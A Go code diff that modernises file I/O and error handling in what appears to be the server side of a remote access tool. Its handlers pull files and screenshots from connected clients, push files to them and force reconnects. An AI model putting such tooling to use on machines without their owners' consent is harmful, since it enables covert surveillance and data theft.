@@ -2,7 +2,6 @@ package server
 
 import (
 	"fmt"
-	"io/ioutil"
 	"log"
 	"os"
 	"path/filepath"
@@ -198,7 +197,7 @@ func (ac *activeClient) Download(c *ishell.Context) {
 		return
 	}
 
-	if err := ioutil.WriteFile(dlPath, r.Content, 0777); err != nil {
+	if err := os.WriteFile(dlPath, r.Content, 0777); err != nil {
 		c.ProgressBar().Final(green("[Server] ") + red("[!] Download failed to write to path:", err))
 		c.ProgressBar().Stop()
 		return
@@ -216,7 +215,7 @@ func (ac *activeClient) Upload(c *ishell.Context) {
 	c.ProgressBar().Indeterminate(true)
 	c.ProgressBar().Start()
 
-	content, err := ioutil.ReadFile(path)
+	content, err := os.ReadFile(path)
 	if err != nil {
 		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed could not read local file:", err))
 		c.ProgressBar().Stop()
@@ -246,8 +245,8 @@ func (ac *activeClient) Screen(c *ishell.Context) {
 	c.ProgressBar().Start()
 
 	filename := getTimeSt() + ".png"
-	var r []byte
 
+	var r []byte
 	if err := ac.RPC.Call("API.Screen", void, &r); err != nil {
 		c.ProgressBar().Final(yellow("["+ac.Data().Name+"] ") + red("[!] Screenshot failed:", err))
 		c.ProgressBar().Stop()
@@ -264,8 +263,7 @@ func (ac *activeClient) Screen(c *ishell.Context) {
 		return
 	}
 
-	err := ioutil.WriteFile(dlPath, r, 0777)
-	if err != nil {
+	if err := os.WriteFile(dlPath, r, 0777); err != nil {
 		c.ProgressBar().Final(green("[Server] ") + red("[!] Screenshot could not be saved:", err))
 		c.ProgressBar().Stop()
 		return
@@ -275,10 +273,13 @@ func (ac *activeClient) Screen(c *ishell.Context) {
 }
 
 // Force client reconnect
-// TODO: I don't think this feature works
 func (ac *activeClient) Reconnect(c *ishell.Context) {
-	var r bool
-	ac.RPC.Call("API.Reconnect", void, &r)
+	if err := ac.RPC.Call("API.Reconnect", void, &void); err != nil {
+		c.Println(yellow("["+ac.Data().Name+"] ") + red("[!] Could not force reconnect:", err))
+		return
+	}
+
+	c.Println(green("[Server] ") + green("[+] Client should reconnect shortly"))
 	c.Stop()
 }
 
